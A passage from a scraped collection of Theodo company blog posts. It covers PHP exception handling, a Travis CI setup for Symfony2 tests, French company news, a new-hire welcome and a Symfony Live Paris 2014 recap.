occurred\r\n}\nNote that the Exception is caught last because ErrorException extends the Exception class.\n\n\nFinally\nSince PHP 5.5, you can specify a finally block after the catch one. The code inside is always executed even if an exception has been thrown or not. Be careful if you use a return statement inside a try/catch/finally block, don\u2019t forget that the last return statement executed is the finally one.\n\n\nSemantic exceptions\nPHP Core provides two exception classes: Exception and ErrorException. But if you want you can create your own extending the `Exception` class. Doing so you can check the type of the thrown exception to do something special as we saw previously. Here is an example where two exceptions are thrown. The first when the file to read does not exist. The other one when it is not readable:\n// File exception.php\r\nclass FileReader\r\n{\r\n    /**\r\n     * @params string The file full path\r\n     * @return    string\r\n     * @throws   Exception\r\n     */\r\n    public function read($file)\r\n    {\r\n        $realFile = realpath($file);\r\n        if (!file_exists($realFile)) {\r\n            throw new FileNotFoundException(sprintf('The file \"%s\" does not exist', $file));\r\n        }\r\n\r\n        if (!$content = file_get_contents($realFile)) {\r\n            throw new FileNotReadableException(sprintf('The file \"%s\" is not readable', $file));\r\n        }\r\n\r\n        return $content;\r\n    }\r\n}\r\n\r\nclass FileNotFoundException extends Exception { }\r\n\r\nclass FileNotReadableException extends Exception { }\nNow we know that when a FileNotFoundException is caught we can create the missing file:\n// File exception.php\r\n$reader = new FileReader();\r\n\r\ntry {\r\n    $file = '/foo/bar.txt';\r\n    echo $reader->read($file);\r\n} catch (FileNotFoundException $e) {\r\n    $filesystem->touch($file);\r\n} catch (Exception $e) {\r\n    echo $e->getMessage();\r\n    exit(1);\r\n}\r\nexit(0);\nWhen you create your exception to should give them explicite name, like you would do with business classes. Using such exceptions allows you to understand the problem seeing the type without looking at the message. You should always try to make your code speaking to you, explaining what really happened to ease the debugging. Creating special exceptions will help you doing so, but you still have to provide explicit messages\u2026\nBefore creating your own exception, have a look a those provided by the SPL library:\n\n\nBadFunctionCallException\nBadMethodCallException\nDomainException\nInvalidArgumentException\nLengthException\nLogicException\nOutOfBoundsException\nOutOfRangeException\nOverflowException\nRangeException\nRuntimeException\nUnderflowException\nUnexpectedValueException\n\n\nNow you know the difference between errors and exceptions. You are able to create error handlers and exception handlers to be sure that your program will never stop with a fatal error. You saw how to catch exceptions. You learned how to create your own exception. So I hope that from now on you will use exceptions instead of returning true or false or returning an array with the status and a message when an exception would be better.\n\n\n\u00a0\n<!--\n/* :Author: David Goodger (goodger@python.org) :Id: $Id: html4css1.css 7614 2013-02-21 15:55:51Z milde $ :Copyright: This stylesheet has been placed in the public domain. Default cascading style sheet for the HTML output of Docutils. See http://docutils.sf.net/docs/howto/html-stylesheets.html for how to customize this style sheet. */ /* used to remove borders from tables and images */ .borderless, table.borderless td, table.borderless th {   border: 0 } table.borderless td, table.borderless th {   /* Override padding for \"table.docutils td\" with \"! important\".      The right padding separates the table cells. */   padding: 0 0.5em 0 0 ! important } .first {   /* Override more specific margin styles with \"! important\". */   margin-top: 0 ! important } .last, .with-subtitle {   margin-bottom: 0 ! important } .hidden {   display: none } a.toc-backref {   text-decoration: none ;   color: black } blockquote.epigraph {   margin: 2em 5em ; } dl.docutils dd {   margin-bottom: 0.5em } object[type=\"image/svg+xml\"], object[type=\"application/x-shockwave-flash\"] {   overflow: hidden; } /* Uncomment (and remove this text!) to get bold-faced definition list terms dl.docutils dt {   font-weight: bold } */ div.abstract {   margin: 2em 5em } div.abstract p.topic-title {   font-weight: bold ;   text-align: center } div.admonition, div.attention, div.caution, div.danger, div.error, div.hint, div.important, div.note, div.tip, div.warning {   margin: 2em ;   border: medium outset ;   padding: 1em } div.admonition p.admonition-title, div.hint p.admonition-title, div.important p.admonition-title, div.note p.admonition-title, div.tip p.admonition-title {   font-weight: bold ;   font-family: sans-serif } div.attention p.admonition-title, div.caution p.admonition-title, div.danger p.admonition-title, div.error p.admonition-title, div.warning p.admonition-title, .code .error {   color: red ;   font-weight: bold ;   font-family: sans-serif } /* Uncomment (and remove this text!) to get reduced vertical space in    compound paragraphs. div.compound .compound-first, div.compound .compound-middle {   margin-bottom: 0.5em } div.compound .compound-last, div.compound .compound-middle {   margin-top: 0.5em } */ div.dedication {   margin: 2em 5em ;   text-align: center ;   font-style: italic } div.dedication p.topic-title {   font-weight: bold ;   font-style: normal } div.figure {   margin-left: 2em ;   margin-right: 2em } div.footer, div.header {   clear: both;   font-size: smaller } div.line-block {   display: block ;   margin-top: 1em ;   margin-bottom: 1em } div.line-block div.line-block {   margin-top: 0 ;   margin-bottom: 0 ;   margin-left: 1.5em } div.sidebar {   margin: 0 0 0.5em 1em ;   border: medium outset ;   padding: 1em ;   background-color: #ffffee ;   width: 40% ;   float: right ;   clear: right } div.sidebar p.rubric {   font-family: sans-serif ;   font-size: medium } div.system-messages {   margin: 5em } div.system-messages h1 {   color: red } div.system-message {   border: medium outset ;   padding: 1em } div.system-message p.system-message-title {   color: red ;   font-weight: bold } div.topic {   margin: 2em } h1.section-subtitle, h2.section-subtitle, h3.section-subtitle, h4.section-subtitle, h5.section-subtitle, h6.section-subtitle {   margin-top: 0.4em } h1.title {   text-align: center } h2.subtitle {   text-align: center } hr.docutils {   width: 75% } img.align-left, .figure.align-left, object.align-left {   clear: left ;   float: left ;   margin-right: 1em } img.align-right, .figure.align-right, object.align-right {   clear: right ;   float: right ;   margin-left: 1em } img.align-center, .figure.align-center, object.align-center {   display: block;   margin-left: auto;   margin-right: auto; } .align-left {   text-align: left } .align-center {   clear: both ;   text-align: center } .align-right {   text-align: right } /* reset inner alignment in figures */ div.align-right {   text-align: inherit } /* div.align-center * { */ /*   text-align: left } */ ol.simple, ul.simple {   margin-bottom: 1em } ol.arabic {   list-style: decimal } ol.loweralpha {   list-style: lower-alpha } ol.upperalpha {   list-style: upper-alpha } ol.lowerroman {   list-style: lower-roman } ol.upperroman {   list-style: upper-roman } p.attribution {   text-align: right ;   margin-left: 50% } p.caption {   font-style: italic } p.credits {   font-style: italic ;   font-size: smaller } p.label {   white-space: nowrap } p.rubric {   font-weight: bold ;   font-size: larger ;   color: maroon ;   text-align: center } p.sidebar-title {   font-family: sans-serif ;   font-weight: bold ;   font-size: larger } p.sidebar-subtitle {   font-family: sans-serif ;   font-weight: bold } p.topic-title {   font-weight: bold } pre.address {   margin-bottom: 0 ;   margin-top: 0 ;   font: inherit } pre.literal-block, pre.doctest-block, pre.math, pre.code {   margin-left: 2em ;   margin-right: 2em } pre.code .ln { color: grey; } /* line numbers */ pre.code, code { background-color: #eeeeee } pre.code .comment, code .comment { color: #5C6576 } pre.code .keyword, code .keyword { color: #3B0D06; font-weight: bold } pre.code .literal.string, code .literal.string { color: #0C5404 } pre.code .name.builtin, code .name.builtin { color: #352B84 } pre.code .deleted, code .deleted { background-color: #DEB0A1} pre.code .inserted, code .inserted { background-color: #A3D289} span.classifier {   font-family: sans-serif ;   font-style: oblique } span.classifier-delimiter {   font-family: sans-serif ;   font-weight: bold } span.interpreted {   font-family: sans-serif } span.option {   white-space: nowrap } span.pre {   white-space: pre } span.problematic {   color: red } span.section-subtitle {   /* font-size relative to parent (h1..h6 element) */   font-size: 80% } table.citation {   border-left: solid 1px gray;   margin-left: 1px } table.docinfo {   margin: 2em 4em } table.docutils {   margin-top: 0.5em ;   margin-bottom: 0.5em } table.footnote {   border-left: solid 1px black;   margin-left: 1px } table.docutils td, table.docutils th, table.docinfo td, table.docinfo th {   padding-left: 0.5em ;   padding-right: 0.5em ;   vertical-align: top } table.docutils th.field-name, table.docinfo th.docinfo-name {   font-weight: bold ;   text-align: left ;   white-space: nowrap ;   padding-left: 0 } /* \"booktabs\" style (no vertical lines) */ table.docutils.booktabs {   border: 0px;   border-top: 2px solid;   border-bottom: 2px solid;   border-collapse: collapse; } table.docutils.booktabs * {   border: 0px; } table.docutils.booktabs th {   border-bottom: thin solid;   text-align: left; } h1 tt.docutils, h2 tt.docutils, h3 tt.docutils, h4 tt.docutils, h5 tt.docutils, h6 tt.docutils {   font-size: 100% } ul.auto-toc {   list-style-type: none }\n-->\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBenjamin Grandfond\r\n  \t\t\t\r\n  \t\t\t\tBenjamin Grandfond - He is \"Technical Team Manager\". Symfony and PHP expert, he likes when you write your tests first and then code. His main interests are Code Quality, best practices, REST architecture and building great new PHP applications over old ones.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tDocteur PH, le magicien de la recherche chez Theodo, a re\u00e7u une lettre frapp\u00e9e du sceau du Minist\u00e8re de l\u2019Enseignement Sup\u00e9rieur et de la Recherche remplie de bonnes nouvelles.\nTheodo a re\u00e7u l\u2019agr\u00e9ment Cr\u00e9dit d\u2019imp\u00f4t innovation (CII) au titre des ann\u00e9es 2013, 2014, 2015. Le Cr\u00e9dit d\u2019imp\u00f4t innovation est une mesure fiscale r\u00e9serv\u00e9e au PME pour la conception de prototypes ou d\u2019installations pilotes de produits nouveaux.\nConcr\u00e8tement, ces derni\u00e8res peuvent b\u00e9n\u00e9ficier d\u2019un cr\u00e9dit d\u2019imp\u00f4t allant jusqu\u2019\u00e0 20 % des d\u00e9penses engag\u00e9es (dans la limite de 400 000\u20ac) avec Theodo pour la r\u00e9alisation de produits innovants. Le cr\u00e9dit d\u2019imp\u00f4t est valable d\u00e8s \u00e0 pr\u00e9sent, y compris pour les d\u00e9penses r\u00e9alis\u00e9es en 2013 !\nPour plus d\u2019informations, contactez-nous \n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAntoine Haguenauer\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nL\u2019Association Fran\u00e7aise des Utilisateurs de Php (AFUP) a \u00e9lu son nouveau pr\u00e9sident : il s\u2019agit de Fabrice Bernhard, Directeur technique et co-fondateur de Theodo. \nThierry Marianne, lead d\u00e9veloppeur chez Theodo a \u00e9galement \u00e9t\u00e9 \u00e9lu au conseil d\u2019administration de l\u2019AFUP.\nL\u2019AFUP a pour objectif de promouvoir le savoir-faire francophone autour des technologies li\u00e9es au langage Php. L\u2019association a entre autres missions celle de r\u00e9pondre aux questions des entreprises sur Php. Tous les ans, le Forum Php r\u00e9unit les meilleurs sp\u00e9cialistes et d\u00e9veloppeurs Php en France.\nTheodo confirme ainsi sa volont\u00e9 de s\u2019impliquer pour faire vivre la communaut\u00e9 Php !\nPlus d\u2019informations sur le site de l\u2019AFUP \n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAntoine Haguenauer\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWe\u2019re super excited to welcome Antoine Gruzelle to dev team!\nThanks to being a true card player shark, he now thrives to be our pro poker planner. He can focus and control his adrenaline to tackle any difficulty that might rise in his upcoming challenges \u2013 be it programming or, well, anything in fact.\nAs a matter of fact, just days after he joined, he showed us what he\u2019s made of by winning Theodo\u2019s first table tennis tournament!\nSo when he seems to be struggling hard, don\u2019t believe that he is overwhelmed\u2026\nHe\u2019s probably bluffing and waiting for the best moment to play his ace!\nFun facts:\n\nTypes exclusively on B\u00e9po keyboard layout\nFeels like a ninja when working on Steganography.\n\n\u00a0\n\n\u00a0\nIf you are interested in steganography or in treasure hunting, do download his picture and find some easter eggs!\nWelcome, Antoine!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tGuillaume Dedrie\r\n  \t\t\t\r\n  \t\t\t\tGuillaume Dedrie - Web developper @Theodo. Loves new technologies.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\u00a0\n\nWanna kick start a project? Wanna get straight to the code as fast as possible, without\u00a0spending too much time on the overheads (creating tests environments and so on\u2026)?\u00a0Well, let\u2019s build a quick ready-to-go Travis environment with a mysql database for your\u00a0tests! 3 minutes starting now!\n\nTravis-GitHub hook configuration\nTravis automatically builds virtual machines to run your tests upon request.\u00a0It has been designed for developers: their virtual machines already come with a good\u00a0base configuration, leaving you very few work to do to customize it to your needs.\nFirst, log in to Travis with your GitHub account. Travis\u2019 services are free for open\u00a0source projects, but you will have to pay for private repositories.\u00a0To automate your tests each time you push a commit to GitHub, you will need to activate\u00a0the hook between these two services: go to your Travis\u2019 repository list and activate\u00a0the switch button for the project you want. You do not have anything to configure,\u00a0everything is done automatically.\nThere you have a handy link to the GitHub repository\u2019s service hooks authorization.\u00a0On this page, you can see a list of services that can hook to GitHub.\u00a0Scroll down and click on \u201cTravis\u201d.\u00a0I advise you to check that the hook is effectively triggered by pressing the test button,\u00a0it\u2019s fun and it\u2019s free \ud83d\ude09\n\n\nKick-start Travis configuration file\nNow that Travis is notified every time you push a commit, it will look for your\u00a0instructions in the .travis.yml file at the root of the project.\u00a0Among other things, this file describes what you want to test, how, and what Travis\u00a0must do before and after the tests. Here is a base ready-to-go Travis configuration file\u00a0for Symfony2 projects:\nphp:\r\n    - 5.5\r\n\r\nbefore_script:\r\n  - cp app/config/parameters.yml.travis app/config/parameters.yml\r\n  - composer install\r\n  - php app/console doctrine:database:create --env=test\r\n  - php app/console doctrine:schema:create --env=test\r\n  - php app/console doctrine:fixtures:load -n --env=test\r\n\r\nscript:\r\n  - phpunit -c app\r\n\r\nnotifications:\r\n  email:\r\n    -  joinus@theodo.fr \ud83d\ude09\n\n\nThe Travis configuration file\u2019s short explanation\nThe first lines are self-explanatory, just note that you can specify more PHP versions\u00a0than only 5.5. After that, you can see the commands we ask Travis to run before\u00a0it launches his tests:\n\nThe first one sets up your Symfony parameters for the test environment.\nThe only trick to know is that Travis\u2019 machines come with an already-started mysql\nservice, configured with a \u201ctravis\u201d user and no password.\nThen goes the typical \u201ccomposer install\u201d that you can customize to fit your needs\nwith your favorite options.\nAnd at last the three app/console commands to create an up-to-date database\nwith your fixtures (for those who need them and activated the bundle).\n\nUnder the \u2018script\u2019 section, you can define which command(s) should be used to launch\u00a0the tests. If you do not specify any, Travis default will be \u2018phpunit\u2019 without arguments.\u00a0But in general for Symfony2 projects, your PHPUnit configuration files are in app/.\nThe last line is used to tell Travis which emails should receive his success/failure\u00a0notifications for this repository. Pretty useful when you deal with many projects!\nFor reference, here is what your parameters.yml.travis file should look like:\nparameters:\r\n    database_user: travis\r\n    database_password: ~\r\n    # Other parameters\nHere it is! The 3-minute explanation is now ending and I hope that it has set your tests on track!\nNo more excuses for not having an up-and-running continuous integration \ud83d\ude09\n\n\n\u00a0\n<!--\n/*\n:Author: David Goodger (goodger@python.org)\n:Id: $Id: html4css1.css 7614 2013-02-21 15:55:51Z milde $\n:Copyright: This stylesheet has been placed in the public domain.\n\nDefault cascading style sheet for the HTML output of Docutils.\n\nSee http://docutils.sf.net/docs/howto/html-stylesheets.html for how to\ncustomize this style sheet.\n*/\n\n/* used to remove borders from tables and images */\n.borderless, table.borderless td, table.borderless th {\n  border: 0 }\n\ntable.borderless td, table.borderless th {\n  /* Override padding for \"table.docutils td\" with \"! important\".\n     The right padding separates the table cells. */\n  padding: 0 0.5em 0 0 ! important }\n\n.first {\n  /* Override more specific margin styles with \"! important\". */\n  margin-top: 0 ! important }\n\n.last, .with-subtitle {\n  margin-bottom: 0 ! important }\n\n.hidden {\n  display: none }\n\na.toc-backref {\n  text-decoration: none ;\n  color: black }\n\nblockquote.epigraph {\n  margin: 2em 5em ; }\n\ndl.docutils dd {\n  margin-bottom: 0.5em }\n\nobject[type=\"image/svg+xml\"], object[type=\"application/x-shockwave-flash\"] {\n  overflow: hidden;\n}\n\n/* Uncomment (and remove this text!) to get bold-faced definition list terms\ndl.docutils dt {\n  font-weight: bold }\n*/\n\ndiv.abstract {\n  margin: 2em 5em }\n\ndiv.abstract p.topic-title {\n  font-weight: bold ;\n  text-align: center }\n\ndiv.admonition, div.attention, div.caution, div.danger, div.error,\ndiv.hint, div.important, div.note, div.tip, div.warning {\n  margin: 2em ;\n  border: medium outset ;\n  padding: 1em }\n\ndiv.admonition p.admonition-title, div.hint p.admonition-title,\ndiv.important p.admonition-title, div.note p.admonition-title,\ndiv.tip p.admonition-title {\n  font-weight: bold ;\n  font-family: sans-serif }\n\ndiv.attention p.admonition-title, div.caution p.admonition-title,\ndiv.danger p.admonition-title, div.error p.admonition-title,\ndiv.warning p.admonition-title, .code .error {\n  color: red ;\n  font-weight: bold ;\n  font-family: sans-serif }\n\n/* Uncomment (and remove this text!) to get reduced vertical space in\n   compound paragraphs.\ndiv.compound .compound-first, div.compound .compound-middle {\n  margin-bottom: 0.5em }\n\ndiv.compound .compound-last, div.compound .compound-middle {\n  margin-top: 0.5em }\n*/\n\ndiv.dedication {\n  margin: 2em 5em ;\n  text-align: center ;\n  font-style: italic }\n\ndiv.dedication p.topic-title {\n  font-weight: bold ;\n  font-style: normal }\n\ndiv.figure {\n  margin-left: 2em ;\n  margin-right: 2em }\n\ndiv.footer, div.header {\n  clear: both;\n  font-size: smaller }\n\ndiv.line-block {\n  display: block ;\n  margin-top: 1em ;\n  margin-bottom: 1em }\n\ndiv.line-block div.line-block {\n  margin-top: 0 ;\n  margin-bottom: 0 ;\n  margin-left: 1.5em }\n\ndiv.sidebar {\n  margin: 0 0 0.5em 1em ;\n  border: medium outset ;\n  padding: 1em ;\n  background-color: #ffffee ;\n  width: 40% ;\n  float: right ;\n  clear: right }\n\ndiv.sidebar p.rubric {\n  font-family: sans-serif ;\n  font-size: medium }\n\ndiv.system-messages {\n  margin: 5em }\n\ndiv.system-messages h1 {\n  color: red }\n\ndiv.system-message {\n  border: medium outset ;\n  padding: 1em }\n\ndiv.system-message p.system-message-title {\n  color: red ;\n  font-weight: bold }\n\ndiv.topic {\n  margin: 2em }\n\nh1.section-subtitle, h2.section-subtitle, h3.section-subtitle,\nh4.section-subtitle, h5.section-subtitle, h6.section-subtitle {\n  margin-top: 0.4em }\n\nh1.title {\n  text-align: center }\n\nh2.subtitle {\n  text-align: center }\n\nhr.docutils {\n  width: 75% }\n\nimg.align-left, .figure.align-left, object.align-left {\n  clear: left ;\n  float: left ;\n  margin-right: 1em }\n\nimg.align-right, .figure.align-right, object.align-right {\n  clear: right ;\n  float: right ;\n  margin-left: 1em }\n\nimg.align-center, .figure.align-center, object.align-center {\n  display: block;\n  margin-left: auto;\n  margin-right: auto;\n}\n\n.align-left {\n  text-align: left }\n\n.align-center {\n  clear: both ;\n  text-align: center }\n\n.align-right {\n  text-align: right }\n\n/* reset inner alignment in figures */\ndiv.align-right {\n  text-align: inherit }\n\n/* div.align-center * { */\n/*   text-align: left } */\n\nol.simple, ul.simple {\n  margin-bottom: 1em }\n\nol.arabic {\n  list-style: decimal }\n\nol.loweralpha {\n  list-style: lower-alpha }\n\nol.upperalpha {\n  list-style: upper-alpha }\n\nol.lowerroman {\n  list-style: lower-roman }\n\nol.upperroman {\n  list-style: upper-roman }\n\np.attribution {\n  text-align: right ;\n  margin-left: 50% }\n\np.caption {\n  font-style: italic }\n\np.credits {\n  font-style: italic ;\n  font-size: smaller }\n\np.label {\n  white-space: nowrap }\n\np.rubric {\n  font-weight: bold ;\n  font-size: larger ;\n  color: maroon ;\n  text-align: center }\n\np.sidebar-title {\n  font-family: sans-serif ;\n  font-weight: bold ;\n  font-size: larger }\n\np.sidebar-subtitle {\n  font-family: sans-serif ;\n  font-weight: bold }\n\np.topic-title {\n  font-weight: bold }\n\npre.address {\n  margin-bottom: 0 ;\n  margin-top: 0 ;\n  font: inherit }\n\npre.literal-block, pre.doctest-block, pre.math, pre.code {\n  margin-left: 2em ;\n  margin-right: 2em }\n\npre.code .ln { color: grey; } /* line numbers */\npre.code, code { background-color: #eeeeee }\npre.code .comment, code .comment { color: #5C6576 }\npre.code .keyword, code .keyword { color: #3B0D06; font-weight: bold }\npre.code .literal.string, code .literal.string { color: #0C5404 }\npre.code .name.builtin, code .name.builtin { color: #352B84 }\npre.code .deleted, code .deleted { background-color: #DEB0A1}\npre.code .inserted, code .inserted { background-color: #A3D289}\n\nspan.classifier {\n  font-family: sans-serif ;\n  font-style: oblique }\n\nspan.classifier-delimiter {\n  font-family: sans-serif ;\n  font-weight: bold }\n\nspan.interpreted {\n  font-family: sans-serif }\n\nspan.option {\n  white-space: nowrap }\n\nspan.pre {\n  white-space: pre }\n\nspan.problematic {\n  color: red }\n\nspan.section-subtitle {\n  /* font-size relative to parent (h1..h6 element) */\n  font-size: 80% }\n\ntable.citation {\n  border-left: solid 1px gray;\n  margin-left: 1px }\n\ntable.docinfo {\n  margin: 2em 4em }\n\ntable.docutils {\n  margin-top: 0.5em ;\n  margin-bottom: 0.5em }\n\ntable.footnote {\n  border-left: solid 1px black;\n  margin-left: 1px }\n\ntable.docutils td, table.docutils th,\ntable.docinfo td, table.docinfo th {\n  padding-left: 0.5em ;\n  padding-right: 0.5em ;\n  vertical-align: top }\n\ntable.docutils th.field-name, table.docinfo th.docinfo-name {\n  font-weight: bold ;\n  text-align: left ;\n  white-space: nowrap ;\n  padding-left: 0 }\n\n/* \"booktabs\" style (no vertical lines) */\ntable.docutils.booktabs {\n  border: 0px;\n  border-top: 2px solid;\n  border-bottom: 2px solid;\n  border-collapse: collapse;\n}\ntable.docutils.booktabs * {\n  border: 0px;\n}\ntable.docutils.booktabs th {\n  border-bottom: thin solid;\n  text-align: left;\n}\n\nh1 tt.docutils, h2 tt.docutils, h3 tt.docutils,\nh4 tt.docutils, h5 tt.docutils, h6 tt.docutils {\n  font-size: 100% }\n\nul.auto-toc {\n  list-style-type: none }\n\n-->\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tReynald Mandel\r\n  \t\t\t\r\n  \t\t\t\tAfter two start-ups creations in web & photography, Reynald joined Theodo to sharpen his skills in Symfony2 and in development in general. As an architect-developper and coach, he helps the teams & the clients to succeed in their projects and use the best practices both in code and agile methodology.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThis blog post is in French as the event it relates to is French-only.\nDe retour du Symfony Live Paris 2014\nCes lundi et mardi nous \u00e9tions au sixi\u00e8me Symfony Live Paris qui se tenait \u00e0 la Cit\u00e9 Internationale Universitaire de Paris. Theodo y \u00e9tait Sponsor Gold et, si vous y \u00e9tiez, vous avez certainement rencontr\u00e9 Fabrice, Lucie, Marek ou moi-m\u00eame.\nPour Theodo, c\u2019est encore une fois un gros succ\u00e8s que ce Symfony Live. Nous avons accueillis environ 200 nouveaux jedis dans notre communaut\u00e9. D\u2019ailleurs n\u2019h\u00e9sitez pas \u00e0 nous envoyer vos photos !\n\nNous avons bien \u00e9videmment pass\u00e9 beaucoup de temps \u00e0 \u00e9changer sur diff\u00e9rents sujets, dont principalement Devops.\nFabrice a pr\u00e9sent\u00e9 le \u201cmiracle de Devops\u201d en moins de 10 minutes, ce qui \u00e9tait semble-t-il trop court pour certains  Rassurez vous, vous pouvez consulter les slides ou (re)voir la vid\u00e9o du Symfony Live Berlin 2013.\nC\u00f4t\u00e9 conf\u00e9rence nous avons pu assister \u00e0 de tr\u00e8s bonnes pr\u00e9sentations dont voici la liste de celles qui nous ont le plus marqu\u00e9.\nOlivier Mansour a commenc\u00e9 fort avec son \u201ctalk\u201d intitul\u00e9 \u201cUn framework presque parfait\u201d. On fait quoi avec Symfony \u00e0 la t\u00e9l\u00e9 ?. Un tr\u00e8s bon retour d\u2019exp\u00e9rience de l\u2019utilisation de Symfony, Composer et autres chez M6Web. Vous pouvez retrouver ses slides sur slideshare.\nFabien Gasser a pr\u00e9sent\u00e9 des solutions pour mettre en place un site e-commerce avec plus ou moins de complexit\u00e9. Une vision d\u2019une architecture orient\u00e9e services tr\u00e8s int\u00e9ressante qui s\u2019applique tr\u00e8s bien \u00e9galement \u00e0 beaucoup d\u2019autres m\u00e9tiers. N\u2019h\u00e9sitez pas \u00e0 consulter ses slides sur slideshare.\nEn fin de cette premi\u00e8re journ\u00e9e, SensioLabsInsight nous a r\u00e9gal\u00e9 avec son OpenBar qui a permis de faire de nombreuses rencontres et des photos plut\u00f4t mythiques ou encore de r\u00e9aliser de nouveaux records.\nLe lendemain a \u00e9t\u00e9 plut\u00f4t difficile pour certains suite \u00e0 cette soir\u00e9e mais elle a commenc\u00e9 aussi tr\u00e8s fort avec la conf\u00e9rence de Julien Pauli. Il nous a pr\u00e9sent\u00e9 ce qu\u2019est OPCache et son fonctionnement interne. Il a aussi montr\u00e9 les avantages apport\u00e9s par ZendOptimizer. Une pr\u00e9sentation \u00e0 voir dont les slides sont sur slideshare.\nS\u2019en est suivi une excellente conf\u00e9rence de Matthieu Moquet qui a pr\u00e9sent\u00e9 l\u2019architecture tr\u00e8s tr\u00e8s tr\u00e8s orient\u00e9e services mise en place chez Bla Bla Car et nous a montr\u00e9 comment ensuite lier le tout avec\u00a0RabbitMQ. Puis il est arriv\u00e9 au sujet principal de sa pr\u00e9sentation et nous a pr\u00e9sent\u00e9 diff\u00e9rentes solutions pour g\u00e9rer l\u2019authentification et l\u2019autorisation aux services gr\u00e2ce \u00e0 un SSO. Un retour d\u2019exp\u00e9rience tr\u00e8s int\u00e9ressant qui, \u00e0 mon avis, fait partie des meilleures conf\u00e9rences de ces deux jours que je vous invite \u00e0 aller voir ! F\u00e9licitations Matthieu \nGeoffrey Bachelet a ensuite encha\u00een\u00e9 et a fait une tr\u00e8s bonne d\u00e9monstration de Docker et comment les d\u00e9veloppeurs Symfony (et tous les autres !) peuvent l\u2019utiliser en particulier dans un contexte Devops. Si vous y jetez un oeil vous pourrez voir comment cr\u00e9er des containers pour chaque service (NGinx, PHP-FPM, MySql) de votre application.\nEn d\u00e9but d\u2019apr\u00e8s midi Fran\u00e7ois Zaninotto a pr\u00e9sent\u00e9 comment 20Minutes associ\u00e9 \u00e0 Marmelab ont r\u00e9alis\u00e9 la migration continue du CMS. Retour tr\u00e8s int\u00e9ressant sur un sujet complexe, bien connu chez Theodo et parfaitement expliqu\u00e9 par Fran\u00e7ois. Nous avons \u00e9t\u00e9 ravis de voir que nous ne sommes pas les seuls \u00e0 \u00eatre persuad\u00e9s qu\u2019il est possible d\u2019\u00eatre agile dans une refonte d\u2019un gros syst\u00e8me. Encore une fois, n\u2019h\u00e9sitez pas \u00e0 lire les slides.\nVous pouvez retrouver l\u2019ensemble des liens vers les slides des conf\u00e9renciers sur github. Comme \u00e0 chaque fois d\u00e9sormais, vous pourrez retrouver les vid\u00e9os des conf\u00e9renciers sur la cha\u00eene Youtube de SensioLabs.\nOn attend avec impatience le prochain Symfony Live qui sera \u00e0 Londres mi-septembre et surtout le Symfony Con de Madrid.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBenjamin Grandfond\r\n  \t\t\t\r\n  \t\t\t\tBenjamin Grandfond - He is \"Technical Team Manager\". Symfony and PHP expert, he likes when you write your tests first and then code. His main interests are Code Quality, best practices, REST architecture and building great new PHP applications over old ones.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
